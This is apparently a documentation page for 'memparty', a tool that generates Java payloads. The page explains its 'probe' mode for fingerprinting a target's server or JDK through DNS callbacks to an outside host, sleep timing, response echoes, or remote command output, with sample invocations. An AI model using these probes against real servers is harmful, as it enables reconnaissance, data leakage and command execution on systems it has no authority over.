# Probes

Use a probe when the target middleware or JDK is unknown. The detected server name is the `server` value for `memparty gen`.

Only these method/content combinations are supported:

| Method (`-m`) | Contents (`-c`) | Required or useful flags |
|---------------|-----------------|--------------------------|
| `DNSLog` | `Server`, `JDK` | `--host <dnslog.domain>` |
| `Sleep` | `Server` | `--sleep-server <guess> --seconds <n>` |
| `ResponseBody`, `ResponseHeader` | `Server`, `Command`, `Bytecode`, `Filter`, `ScriptEngine` | `--server <guess> --req-param-name <name>` |

`OS` and `BasicInfo` are enum values but are not usable through these methods. `ResponseHeader` requires v3+ and accepts `--resp-header-name`.

With `--server Unknown`, the probe identifies the middleware. For response probes, send the configured request parameter or header so the probe can find the live request. `Command` also accepts `--command-template`.

```bash
memparty probe -m DNSLog -c Server -p DefaultBase64 --host <dnslog.domain>
memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
memparty probe -m ResponseBody -c Command -p DefaultBase64 \
  --server Tomcat --req-param-name p
memparty probe -m ResponseHeader -c Server -p DefaultBase64 \
  --server Unknown --req-param-name p
```

Probe output supports the same `-o` and `--json` behavior as generation. Use a concrete packer variant when writing one output file. MCP uses `generate_probe` and `outputFile`.
